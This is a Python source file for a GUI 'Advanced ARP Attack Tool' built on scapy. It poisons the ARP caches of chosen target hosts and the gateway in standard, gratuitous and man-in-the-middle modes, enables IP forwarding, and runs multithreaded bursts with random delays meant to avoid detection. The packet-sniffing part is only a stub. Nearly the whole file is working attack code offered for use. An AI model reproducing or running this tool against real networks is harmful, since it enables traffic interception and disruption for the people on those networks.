from scapy.all import *
import psutil
import socket
import uuid
import threading
import queue
import time
import random
import logging
import sys
import os
import re
import colorama
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, Back

# Initialize color output
colorama.init(autoreset=True)

def get_network_interfaces():
    """Get active network interfaces"""
    return [
        iface for iface, addrs in psutil.net_if_addrs().items() 
        if any(addr.family == socket.AF_INET for addr in addrs)
    ]

def get_local_mac():
    """Get the local MAC address"""
    return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

def get_local_ip(interface=None):
    """Get the IP address of the specified interface"""
    if interface:
        addrs = psutil.net_if_addrs()
        for addr in addrs.get(interface, []):
            if addr.family == socket.AF_INET:
                return addr.address
    return None

def validate_ip(ip):
    """Verify that the IP address is valid"""
    pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
    match = re.match(pattern, ip)
    if not match:
        return False
    
    for i in range(1, 5):
        octet = int(match.group(i))
        if octet < 0 or octet > 255:
            return False
    
    return True

class AdvancedARPSpoofing:
    def __init__(self, gateway, targets, interface, log_callback=None):
        """
        Initialize the ARP spoofing attacker
        
        :param gateway: Gateway IP address
        :param targets: Target IP address list
        :param interface: Network interface name
        :param log_callback: Function to call when there's a new log entry
        """
        self.gateway = gateway
        self.targets = targets
        self.interface = interface
        self.log_callback = log_callback
        
        # Get local MAC and IP
        self.local_mac = get_local_mac()
        self.local_ip = get_local_ip(interface)
        
        # Set stop events and thread list
        self.stop_event = threading.Event()
        self.attack_threads = []
        self.attack_timer = None
        
        # Interval attack settings
        self.interval_mode = False
        self.interval_seconds = 0
        self.burst_duration = 0
        
        # MAC address cache
        self.mac_cache = {}
        
        # Log queue and log configuration
        self.attack_log_queue = queue.Queue()
        
        # Setting up logging
        self.logger = logging.getLogger("arp_spoof")
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # Adding a console processor
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)
        
        # Adding a file handler with proper error handling
        try:
            # Ensure log directory exists
            log_file_path = "arp_attack.log"
            file_handler = logging.FileHandler(log_file_path, mode='a')
            file_handler.setFormatter(formatter)
            file_handler.setLevel(logging.INFO)
            self.logger.addHandler(file_handler)
            
            # Test write to verify file access
            self.logger.info("Logging system initialized")
            self.attack_log_queue.put(f"[+] Logging to file: {log_file_path}")
        except Exception as e:
            self.attack_log_queue.put(f"[!] Failed to create log file: {e}")
            # Try to create log in user's home directory if current directory fails
            try:
                home_dir = os.path.expanduser("~")
                log_file_path = os.path.join(home_dir, "arp_attack.log")
                file_handler = logging.FileHandler(log_file_path, mode='a')
                file_handler.setFormatter(formatter)
                file_handler.setLevel(logging.INFO)
                self.logger.addHandler(file_handler)
                self.attack_log_queue.put(f"[+] Logging to alternate file: {log_file_path}")
            except Exception as e2:
                self.attack_log_queue.put(f"[!] Failed to create alternate log file: {e2}")
                self.logger.error(f"Failed to create log file: {e2}")
            
        # Start a thread to process logs from the queue
        if self.log_callback:
            self.log_processor_thread = threading.Thread(target=self._process_logs, daemon=True)
            self.log_processor_thread.start()

    def _process_logs(self):
        """Process logs from the queue and send them to the callback function"""
        while True:
            try:
                # Get a log message from the queue (blocking with timeout)
                log_message = self.attack_log_queue.get(timeout=0.5)
                
                # Pass the message to the callback if one exists
                if self.log_callback:
                    self.log_callback(log_message)
                    
                # Mark the task as done
                self.attack_log_queue.task_done()
            except queue.Empty:
                # No log message available, check if we should exit
                if self.stop_event.is_set():
                    break
            except Exception as e:
                # Log processing error
                self.logger.error(f"Error processing log message: {e}")
                
                # Try to notify the UI of the error
                if self.log_callback:
                    try:
                        self.log_callback(f"[!] Log processing error: {e}")
                    except:
                        pass

    def setup_attack_environment(self):
        """Set up the attack environment"""
        self.attack_log_queue.put("[*] Setting up attack environment...")
        
        # Enable IP forwarding if necessary
        self.enable_ip_forwarding()
        
        # Create ARP backup for restoration
        self.arp_backup = {}
        
        # Back up MAC addresses of targets and gateway for later use
        try:
            self.arp_backup[self.gateway] = self._get_mac_address(self.gateway)
            for target in self.targets:
                self.arp_backup[target] = self._get_mac_address(target)
        except Exception as e:
            self.logger.error(f"Error backing up MAC addresses: {e}")
        
        # Setup periodic attack refresh timer to maintain the deception
        self.attack_timer = threading.Timer(30.0, self.refresh_attack)
        self.attack_timer.daemon = True

    def monitor_network_activity(self):
        """Start network monitoring"""
        pass  # Could be implemented with packet monitoring using scapy
        
    def packet_sniffer(self, filter_str, strategy):
        """
        Sniff packets with the given filter
        
        :param filter_str: Filter string for scapy.sniff
        :param strategy: Attack strategy
        """
        if strategy == 'mitm':
            self.attack_log_queue.put("[*] Starting packet sniffer with filter: " + filter_str)
            
            # In a real implementation, this would capture and analyze traffic
            sniffer_thread = threading.Thread(
                target=self._sniff_packets,
                args=(filter_str,),
                daemon=True
            )
            sniffer_thread.start()
        else:
            self.attack_log_queue.put("[!] Packet sniffing is only available in MITM mode")

    def _sniff_packets(self, filter_str):
        """
        Actual packet sniffing function
        
        :param filter_str: Filter string for scapy.sniff
        """
        try:
            # This is where actual sniffing would occur
            # For safety reasons, we'll just log that we would be sniffing
            self.attack_log_queue.put("[*] Packet sniffer would be capturing traffic here")
            
            # Wait until stop_event is set
            while not self.stop_event.is_set():
                time.sleep(1)
                
        except Exception as e:
            self.logger.error(f"Error in packet sniffer: {e}")
            self.attack_log_queue.put(f"[!] Packet sniffer error: {e}")

    def refresh_attack(self):
        """Refresh the ARP poisoning to maintain the attack"""
        if not self.stop_event.is_set():
            self.attack_log_queue.put("[*] Refreshing ARP poisoning...")
            
            # Reschedule the timer
            self.attack_timer = threading.Timer(30.0, self.refresh_attack)
            self.attack_timer.daemon = True
            self.attack_timer.start()

    def enable_ip_forwarding(self):
        """Enable IP forwarding for MITM attacks"""
        try:
            if sys.platform.startswith('linux'):
                # Linux
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
                self.attack_log_queue.put("[*] IP Forwarding enabled (Linux)")
            elif sys.platform == 'darwin':
                # macOS
                os.system('sysctl -w net.inet.ip.forwarding=1')
                self.attack_log_queue.put("[*] IP Forwarding enabled (macOS)")
            elif sys.platform == 'win32':
                # Windows
                os.system('reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f')
                self.attack_log_queue.put("[*] IP Forwarding enabled (Windows) - May require restart")
        except Exception as e:
            self.logger.error(f"Failed to enable IP forwarding: {e}")
            self.attack_log_queue.put(f"[!] Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self):
        """Disable IP forwarding after attack"""
        try:
            if sys.platform.startswith('linux'):
                # Linux
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('0')
                self.attack_log_queue.put("[*] IP Forwarding disabled (Linux)")
            elif sys.platform == 'darwin':
                # macOS
                os.system('sysctl -w net.inet.ip.forwarding=0')
                self.attack_log_queue.put("[*] IP Forwarding disabled (macOS)")
            elif sys.platform == 'win32':
                # Windows - simply notify, as this would require a restart
                self.attack_log_queue.put("[*] IP Forwarding change on Windows requires restart")
        except Exception as e:
            self.logger.error(f"Failed to disable IP forwarding: {e}")
            self.attack_log_queue.put(f"[!] Failed to disable IP forwarding: {e}")

    def _get_mac_address(self, ip):
        """
        Get MAC address of target IP using ARP
        
        :param ip: Target IP address
        :return: MAC address of target
        """
        # Check if the MAC is in the cache to avoid network traffic
        if ip in self.mac_cache:
            return self.mac_cache[ip]
        
        try:
            # Create and send ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_packet = broadcast/arp_request
            
            # Send and receive response
            response = srp(arp_request_packet, timeout=3, verbose=False, iface=self.interface)[0]
            
            if response:
                # MAC address is captured from the response
                mac = response[0][1].hwsrc
                self.mac_cache[ip] = mac
                return mac
            else:
                self.attack_log_queue.put(f"[!] Failed to get MAC address for {ip}")
                return None
        except Exception as e:
            self.logger.error(f"Error getting MAC for {ip}: {e}")
            self.attack_log_queue.put(f"[!] Error getting MAC for {ip}: {e}")
            return None

    def _standard_arp_spoof(self, target_ip, spoof_ip):
        """
        Standard ARP spoofing technique
        
        :param target_ip: Target IP to spoof
        :param spoof_ip: IP to impersonate
        """
        try:
            # Get target MAC
            target_mac = self._get_mac_address(target_ip)
            
            if not target_mac:
                self.attack_log_queue.put(f"[!] Failed to resolve MAC for {target_ip}, skipping")
                return
                
            # Create ARP packet to spoof the target
            # op=2 means ARP response
            arp_packet = ARP(
                op=2,                 # Response operation
                pdst=target_ip,       # Target IP
                hwdst=target_mac,     # Target MAC
                psrc=spoof_ip,        # Gateway IP
                hwsrc=self.local_mac  # Our MAC (attacker)
            )
            
            # Send the packet
            send(arp_packet, verbose=False, iface=self.interface)
            
        except Exception as e:
            self.logger.error(f"Standard ARP spoofing error for {target_ip}: {e}")

    def _gratuitous_arp_attack(self, target_ip, gateway_ip):
        """
        Gratuitous ARP attack technique
        
        :param target_ip: Target IP address
        :param gateway_ip: Gateway IP address
        """
        try:
            # Get target MAC
            target_mac = self._get_mac_address(target_ip)
            
            if not target_mac:
                self.attack_log_queue.put(f"[!] Failed to resolve MAC for {target_ip}, skipping")
                return
                
            # Create a gratuitous ARP packet
            # A gratuitous ARP is like an announcement "This is my IP and MAC"
            gratuitous_arp = ARP(
                op=1,                  # ARP request
                psrc=gateway_ip,       # Gateway IP
                pdst=target_ip,        # Target IP
                hwdst="ff:ff:ff:ff:ff:ff", # Broadcast
                hwsrc=self.local_mac   # Our MAC (attacker)
            )
            
            # Send the packet
            send(gratuitous_arp, verbose=False, iface=self.interface)
            
            # Also send a standard ARP spoof for redundancy
            self._standard_arp_spoof(target_ip, gateway_ip)
            
        except Exception as e:
            self.logger.error(f"Gratuitous ARP attack error for {target_ip}: {e}")

    def attack_worker(self, strategy):
        """
        Attack Worker Thread
        
        :param strategy: Attack strategy
        """
        while not self.stop_event.is_set():
            try:
                # If we're in interval mode, we need to handle attack bursts
                if self.interval_mode:
                    # Perform attack burst
                    self.attack_log_queue.put(f"[*] Starting attack burst...")
                    
                    # Start time for burst duration tracking
                    burst_start = time.time()
                    
                    # Continue attacking until burst duration is reached
                    while time.time() - burst_start < self.burst_duration and not self.stop_event.is_set():
                        # Perform ARP spoofing on each target
                        for target in self.targets:
                            # Select attack method based on strategy
                            if strategy == 'standard' or strategy == 'mitm':
                                # Trick the target into thinking we are the gateway
                                self._standard_arp_spoof(target, self.gateway)
                                
                                # For MITM attacks, also spoof the gateway
                                if strategy == 'mitm':
                                    self._standard_arp_spoof(self.gateway, target)
                            
                            elif strategy == 'gratuitous':
                                # Performing a Gratuitous ARP Attack
                                self._gratuitous_arp_attack(target, self.gateway)
                            
                            # Small delay between targets
                            time.sleep(random.uniform(0.5, 1.0))
                            
                            # Check if it is stopped
                            if self.stop_event.is_set():
                                break
                    
                    # Log end of burst
                    if not self.stop_event.is_set():
                        self.attack_log_queue.put(f"[*] Attack burst completed. Sleeping for {self.interval_seconds} seconds...")
                        # Sleep until next interval
                        time.sleep(self.interval_seconds)
                else:
                    # Original continuous attack mode
                    # Perform ARP spoofing on each target
                    for target in self.targets:
                        # Select attack method based on strategy
                        if strategy == 'standard' or strategy == 'mitm':
                            # Trick the target into thinking we are the gateway
                            self._standard_arp_spoof(target, self.gateway)
                            
                            # For MITM attacks, also spoof the gateway
                            if strategy == 'mitm':
                                self._standard_arp_spoof(self.gateway, target)
                        
                        elif strategy == 'gratuitous':
                            # Performing a Gratuitous ARP Attack
                            self._gratuitous_arp_attack(target, self.gateway)
                        
                        # Random delay to avoid detection
                        time.sleep(random.uniform(1.0, 3.0))
                        
                        # Check if it is stopped
                        if self.stop_event.is_set():
                            break
                
            except Exception as e:
                self.logger.error(f"Attack thread error: {e}")
                time.sleep(1)

    def start_attack(self, strategy='standard', threads=10, duration=None, enable_sniffing=False, 
                     interval_mode=False, interval_seconds=60, burst_duration=5):
        """
        Launch the attack
        
        :param strategy: Attack strategy
        :param threads: Number of concurrent threads
        :param duration: Attack duration (seconds)
        :param enable_sniffing: Whether to enable packet sniffing
        :param interval_mode: Whether to use interval attacks
        :param interval_seconds: Seconds between attack bursts
        :param burst_duration: Duration of each attack burst in seconds
        """
        self.attack_log_queue.put(f"[*] Start ARP attack")
        self.attack_log_queue.put(f"targets: {', '.join(self.targets)}")
        self.attack_log_queue.put(f"Gateway: {self.gateway}")
        self.attack_log_queue.put(f"Attack strategy: {strategy}")
        self.attack_log_queue.put(f"Local MAC: {self.local_mac}")
        self.attack_log_queue.put(f"Local IP: {self.local_ip}")
        
        # Set interval attack parameters
        self.interval_mode = interval_mode
        self.interval_seconds = interval_seconds
        self.burst_duration = burst_duration
        
        if interval_mode:
            self.attack_log_queue.put(f"[*] Interval mode enabled: {burst_duration}s attack every {interval_seconds}s")
        
        start_time = time.time()
        
        # Reset state
        self.stop_event.clear()
        self.mac_cache.clear()
        
        # Setting up the attack environment
        self.setup_attack_environment()
        
        # Create and start the attack thread
        self.attack_threads = []
        for _ in range(threads):
            thread = threading.Thread(
                target=self.attack_worker,
                args=(strategy,),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
        
        # Start network monitoring
        self.monitor_network_activity()
        
        # Enable packet sniffing if requested for any attack type
        if enable_sniffing:
            self.packet_sniffer("ip", strategy)
        
        # Start attack refresh timer
        self.attack_timer.start()
        
        # If a duration is set, the attack will stop after the specified time.
        if duration:
            try:
                # Create a timer to stop the attack after the duration
                stop_timer = threading.Timer(duration, self.stop_attack)
                stop_timer.daemon = True
                stop_timer.start()
                self.attack_log_queue.put(f"[*] The attack will automatically stop after {duration} seconds")
            except Exception as e:
                self.logger.error(f"Error setting up duration timer: {e}")
        else:
            self.attack_log_queue.put(f"[*] Attack in progress with no time limit")

    def stop_attack(self):
        """
        Stop all attack threads immediately
        """
        self.attack_log_queue.put(f"[!] Stopping attack...")
        self.stop_event.set()
        
        # Stop Timer
        if hasattr(self, 'attack_timer') and self.attack_timer:
            self.attack_timer.cancel()
        
        # Force waiting for all threads to terminate, up to 5 seconds
        wait_time = 0
        while any(t.is_alive() for t in self.attack_threads) and wait_time < 5:
            time.sleep(0.5)
            wait_time += 0.5
        
        # If there are still threads active, print a warning
        if any(t.is_alive() for t in self.attack_threads):
            self.attack_log_queue.put(f"[!] Some attack threads are still running, force to continue...")
        
        # Disable IP forwarding
        self.disable_ip_forwarding()
        
        self.attack_log_queue.put(f"[✓] Attack stopped")

    def restore_arp_table(self):
        """
        Restore the ARP table
        """
        self.attack_log_queue.put(f"[*] Performing network restore...")
        
        # Make sure the attack has stopped
        self.stop_event.set()
        
        # Waiting for a thread to terminate
        time.sleep(1)
        
        for target in self.targets:
            try:
                target_mac = self.arp_backup.get(target) if hasattr(self, 'arp_backup') else self._get_mac_address(target)
                gateway_mac = self.arp_backup.get(self.gateway) if hasattr(self, 'arp_backup') else self._get_mac_address(self.gateway)
                
                if not target_mac or not gateway_mac:
                    continue
                
                # Send the correct gateway MAC to the target
                restore_target = ARP(
                    op=2, 
                    pdst=target, 
                    hwdst=target_mac, 
                    psrc=self.gateway, 
                    hwsrc=gateway_mac
                )
                
                # Send the correct destination MAC to the gateway
                restore_gateway = ARP(
                    op=2, 
                    pdst=self.gateway, 
                    hwdst=gateway_mac, 
                    psrc=target, 
                    hwsrc=target_mac
                )
                
                # Send multiple times to ensure the restore is successful
                for _ in range(5):
                    send(restore_target, verbose=False)
                    send(restore_gateway, verbose=False)
                    time.sleep(0.2)
                
                self.attack_log_queue.put(f"[✓] Restored the ARP table of {target}")
                
            except Exception as e:
                self.logger.error(f"Restoring {target} failed: {e}")
        
        # Send an additional gratuitous ARP broadcast to speed up updates
        try:
            for ip, mac in self.arp_backup.items() if hasattr(self, 'arp_backup') else []:
                gratuitous_packet = ARP(
                    op=1,
                    psrc=ip,
                    pdst=ip,
                    hwsrc=mac,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                send(gratuitous_packet, verbose=False, count=2)
        except Exception as e:
            self.logger.error(f"Failed to send gratuitous ARP update: {e}")


class ARPAttackGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced ARP Attack Tool")
        self.root.geometry("900x700")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Configure style
        style = ttk.Style()
        style.configure("TButton", padding=6, relief="flat", background="#4CAF50")
        style.configure("Red.TButton", background="#f44336")
        style.configure("TLabel", padding=6)
        style.configure("TFrame", padding=10)
        
        # Initialize ARP spoofer
        self.arp_spoofer = None
        self.is_attacking = False
        
        # Create main frame
        main_frame = ttk.Frame(root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill=tk.X, pady=10)
        
        header_label = ttk.Label(header_frame, text="Advanced ARP Attack Tool", font=("Helvetica", 16, "bold"))
        header_label.pack()
        
        # Create configuration frame
        config_frame = ttk.LabelFrame(main_frame, text="Attack Configuration")
        config_frame.pack(fill=tk.X, pady=10, padx=5)
        
        # Network Interface Selection
        interface_frame = ttk.Frame(config_frame)
        interface_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(interface_frame, text="Network Interface:").pack(side=tk.LEFT, padx=5)
        
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(interface_frame, textvariable=self.interface_var)
        self.interface_combo['values'] = get_network_interfaces()
        if len(self.interface_combo['values']) > 0:
            self.interface_combo.current(0)
        self.interface_combo.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Gateway IP
        gateway_frame = ttk.Frame(config_frame)
        gateway_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(gateway_frame, text="Gateway IP:").pack(side=tk.LEFT, padx=5)
        
        self.gateway_var = tk.StringVar()
        gateway_entry = ttk.Entry(gateway_frame, textvariable=self.gateway_var)
        gateway_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Target IPs
        target_frame = ttk.Frame(config_frame)
        target_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(target_frame, text="Target IPs:").pack(side=tk.LEFT, padx=5)
        
        self.targets_var = tk.StringVar()
        targets_entry = ttk.Entry(target_frame, textvariable=self.targets_var)
        targets_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        ttk.Label(target_frame, text="(comma separated)").pack(side=tk.LEFT, padx=5)
        
        # Attack Strategy
        strategy_frame = ttk.Frame(config_frame)
        strategy_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(strategy_frame, text="Attack Strategy:").pack(side=tk.LEFT, padx=5)
        
        self.strategy_var = tk.StringVar(value="standard")
        
        standard_radio = ttk.Radiobutton(strategy_frame, text="Standard ARP", variable=self.strategy_var, value="standard")
        standard_radio.pack(side=tk.LEFT, padx=5)
        
        gratuitous_radio = ttk.Radiobutton(strategy_frame, text="Gratuitous ARP", variable=self.strategy_var, value="gratuitous")
        gratuitous_radio.pack(side=tk.LEFT, padx=5)
        
        mitm_radio = ttk.Radiobutton(strategy_frame, text="MITM", variable=self.strategy_var, value="mitm")
        mitm_radio.pack(side=tk.LEFT, padx=5)
        
        # Interval Attack Frame
        interval_frame = ttk.LabelFrame(config_frame, text="Interval Attack")
        interval_frame.pack(fill=tk.X, pady=5)

        interval_check_frame = ttk.Frame(interval_frame)
        interval_check_frame.pack(fill=tk.X, pady=5)

        self.interval_var = tk.BooleanVar(value=False)
        interval_check = ttk.Checkbutton(interval_check_frame, text="Enable Interval Attack", 
                                        variable=self.interval_var, 
                                        command=self.toggle_interval_controls)
        interval_check.pack(side=tk.LEFT, padx=5)

        # Add tooltip info
        ttk.Label(interval_check_frame, text="(Performs short bursts of attacks at regular intervals)").pack(side=tk.LEFT, padx=5)

        # Store references to interval settings widgets
        self.interval_settings_frame = ttk.Frame(interval_frame)
        self.interval_settings_frame.pack(fill=tk.X, pady=5)

        # Interval seconds settings
        ttk.Label(self.interval_settings_frame, text="Interval (seconds):").pack(side=tk.LEFT, padx=5)
        self.interval_sec_var = tk.StringVar(value="60")
        self.interval_sec_entry = ttk.Entry(self.interval_settings_frame, textvariable=self.interval_sec_var, width=8, state='disabled')
        self.interval_sec_entry.pack(side=tk.LEFT, padx=5)

        # Burst duration settings
        ttk.Label(self.interval_settings_frame, text="Burst Duration (seconds):").pack(side=tk.LEFT, padx=5)
        self.burst_duration_var = tk.StringVar(value="5")
        self.burst_duration_entry = ttk.Entry(self.interval_settings_frame, textvariable=self.burst_duration_var, width=8, state='disabled')
        self.burst_duration_entry.pack(side=tk.LEFT, padx=5)

        # Initially disable interval settings
        self.toggle_interval_controls()
        
        # Additional Options Frame
        options_frame = ttk.LabelFrame(config_frame, text="Additional Options")
        options_frame.pack(fill=tk.X, pady=5)
        
        # Threads
        threads_frame = ttk.Frame(options_frame)
        threads_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(threads_frame, text="Threads:").pack(side=tk.LEFT, padx=5)
        
        self.threads_var = tk.StringVar(value="10")
        threads_entry = ttk.Entry(threads_frame, textvariable=self.threads_var, width=5)
        threads_entry.pack(side=tk.LEFT, padx=5)
        
        # Duration
        ttk.Label(threads_frame, text="Duration (seconds, 0=unlimited):").pack(side=tk.LEFT, padx=5)
        
        self.duration_var = tk.StringVar(value="0")
        duration_entry = ttk.Entry(threads_frame, textvariable=self.duration_var, width=8)
        duration_entry.pack(side=tk.LEFT, padx=5)
        
        # Packet Sniffing
        sniffing_frame = ttk.Frame(options_frame)
        sniffing_frame.pack(fill=tk.X, pady=5)
        
        self.sniffing_var = tk.BooleanVar(value=False)
        sniffing_check = ttk.Checkbutton(sniffing_frame, text="Enable Packet Sniffing", variable=self.sniffing_var)
        sniffing_check.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(sniffing_frame, text="(Only available in MITM mode)").pack(side=tk.LEFT, padx=5)
        
        # Action Buttons Frame
        action_frame = ttk.Frame(main_frame)
        action_frame.pack(fill=tk.X, pady=10)
        
        # Start Attack Button
        self.start_button = ttk.Button(action_frame, text="Start Attack", command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        # Stop Attack Button (initially disabled)
        self.stop_button = ttk.Button(action_frame, text="Stop Attack", command=self.stop_attack, state="disabled")
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        # Restore Network Button
        self.restore_button = ttk.Button(action_frame, text="Restore Network", command=self.restore_network, state="disabled")
        self.restore_button.pack(side=tk.LEFT, padx=5)
        
        # Log Output
        log_frame = ttk.LabelFrame(main_frame, text="Attack Log")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Status Bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=5)
        
        # Initialize with a welcome message
        self.add_log_message("Welcome to Advanced ARP Attack Tool")
        self.add_log_message("Select network interface, gateway and target IPs to begin")
        
        # Set local IP if possible
        if self.interface_var.get():
            local_ip = get_local_ip(self.interface_var.get())
            if local_ip:
                self.add_log_message(f"Local IP on {self.interface_var.get()}: {local_ip}")
        
    def toggle_interval_controls(self):
        """Enable or disable interval attack settings based on checkbox state"""
        if self.interval_var.get():
            state = "normal"
        else:
            state = "disabled"
            
        self.interval_sec_entry.config(state=state)
        self.burst_duration_entry.config(state=state)
    
    def add_log_message(self, message):
        """Add a message to the log text widget"""
        self.log_text.config(state=tk.NORMAL)
        timestamp = time.strftime("%H:%M:%S", time.localtime())
        
        # Format different message types with colors if possible
        if message.startswith("[+]") or message.startswith("[✓]"):
            # Success messages in green
            self.log_text.insert(tk.END, f"{timestamp} {message}\n", "success")
        elif message.startswith("[!]"):
            # Warning/Error messages in red
            self.log_text.insert(tk.END, f"{timestamp} {message}\n", "error")
        elif message.startswith("[*]"):
            # Info messages in blue
            self.log_text.insert(tk.END, f"{timestamp} {message}\n", "info")
        else:
            # Normal messages
            self.log_text.insert(tk.END, f"{timestamp} {message}\n")
        
        # Auto-scroll to the end
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        
        # Configure tag colors
        self.log_text.tag_configure("success", foreground="green")
        self.log_text.tag_configure("error", foreground="red")
        self.log_text.tag_configure("info", foreground="blue")
    
    def start_attack(self):
        """Start the ARP spoofing attack"""
        # Get configuration values
        interface = self.interface_var.get()
        gateway = self.gateway_var.get()
        targets_str = self.targets_var.get()
        strategy = self.strategy_var.get()
        threads = int(self.threads_var.get())
        enable_sniffing = self.sniffing_var.get()
        interval_mode = self.interval_var.get()
        
        # Parse duration (0 means unlimited)
        try:
            duration = int(self.duration_var.get())
            if duration <= 0:
                duration = None
        except ValueError:
            duration = None
        
        # Parse interval parameters
        try:
            interval_seconds = int(self.interval_sec_var.get())
            if interval_seconds <= 0:
                interval_seconds = 60  # Default value
        except ValueError:
            interval_seconds = 60
            
        try:
            burst_duration = int(self.burst_duration_var.get())
            if burst_duration <= 0:
                burst_duration = 5  # Default value
        except ValueError:
            burst_duration = 5
        
        # Validate input
        if not interface:
            messagebox.showerror("Error", "Please select a network interface")
            return
            
        if not gateway or not validate_ip(gateway):
            messagebox.showerror("Error", "Please enter a valid gateway IP")
            return
            
        if not targets_str:
            messagebox.showerror("Error", "Please enter at least one target IP")
            return
            
        # Parse targets (comma separated)
        targets = [ip.strip() for ip in targets_str.split(",")]
        
        # Validate all target IPs
        for target in targets:
            if not validate_ip(target):
                messagebox.showerror("Error", f"Invalid target IP: {target}")
                return
        
        # Check if MITM strategy is selected
        if strategy == "mitm" and not enable_sniffing:
            answer = messagebox.askyesno("Confirm", "MITM strategy is selected but packet sniffing is disabled. Enable packet sniffing?")
            if answer:
                self.sniffing_var.set(True)
                enable_sniffing = True
        
        # Initialize the ARP spoofer
        self.arp_spoofer = AdvancedARPSpoofing(
            gateway=gateway, 
            targets=targets, 
            interface=interface,
            log_callback=self.add_log_message
        )
        
        # Start the attack
        try:
            self.arp_spoofer.start_attack(
                strategy=strategy,
                threads=threads,
                duration=duration,
                enable_sniffing=enable_sniffing,
                interval_mode=interval_mode,
                interval_seconds=interval_seconds,
                burst_duration=burst_duration
            )
            
            # Update UI state
            self.is_attacking = True
            self.start_button.config(state="disabled")
            self.stop_button.config(state="normal")
            self.restore_button.config(state="normal")
            self.status_var.set("Attack in progress")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start attack: {e}")
            self.add_log_message(f"[!] Failed to start attack: {e}")
    
    def stop_attack(self):
        """Stop the current attack"""
        if self.arp_spoofer and self.is_attacking:
            try:
                self.arp_spoofer.stop_attack()
                
                # Update UI state
                self.is_attacking = False
                self.start_button.config(state="normal")
                self.stop_button.config(state="disabled")
                self.status_var.set("Attack stopped")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to stop attack: {e}")
                self.add_log_message(f"[!] Failed to stop attack: {e}")
    
    def restore_network(self):
        """Restore the network to a normal state"""
        if self.arp_spoofer:
            try:
                # First ensure attack is stopped
                if self.is_attacking:
                    self.arp_spoofer.stop_attack()
                    self.is_attacking = False
                
                # Then restore ARP tables
                self.arp_spoofer.restore_arp_table()
                
                # Update UI state
                self.start_button.config(state="normal")
                self.stop_button.config(state="disabled")
                self.restore_button.config(state="disabled")
                self.status_var.set("Network restored")
                
            except Exception as e:
                messagebox.showerror("Error", f"Failed to restore network: {e}")
                self.add_log_message(f"[!] Failed to restore network: {e}")
    
    def on_closing(self):
        """Handle window closing event"""
        if self.is_attacking:
            answer = messagebox.askyesno("Confirm", "Attack is still running. Do you want to stop and restore the network?")
            if answer:
                try:
                    if self.arp_spoofer:
                        self.arp_spoofer.stop_attack()
                        self.arp_spoofer.restore_arp_table()
                        self.add_log_message("[✓] Attack stopped and network restored")
                except Exception as e:
                    self.add_log_message(f"[!] Failed to clean up: {e}")
        
        self.root.destroy()

def main():
    root = tk.Tk()
    app = ARPAttackGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()